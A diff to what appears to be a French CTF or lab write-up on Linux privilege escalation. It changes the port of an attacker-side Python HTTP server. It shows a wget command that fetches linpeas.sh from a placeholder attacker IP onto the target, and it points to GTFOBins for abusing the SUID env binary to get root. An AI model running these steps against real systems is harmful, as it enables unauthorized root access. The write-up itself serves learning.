@@ -93,12 +93,12 @@ On va utiliser l'outil [Linpeas](https://github.com/carlospolop/PEASS-ng/tree/ma
 Je lançe un serveur HTTP sur ma propre machine :
 
 ```
-python3 -m http.server
+python3 -m http.server 8080
 ```
 Puis je récupère le script *linpeas.sh* sur la machine cible pour l'exécuter :
 
 ```
-wget mettreIpIci:8000/linpeas.sh
+wget mettreIpIci:8080/linpeas.sh
 ```
 Après observation, on remarque que le binaire env semble être un vecteur intéréssant à explorer. Un petit tour sur [GTFOBins](https://gtfobins.github.io/gtfobins/env/) pour créer une copie du SUID avec les privilèges root :
 
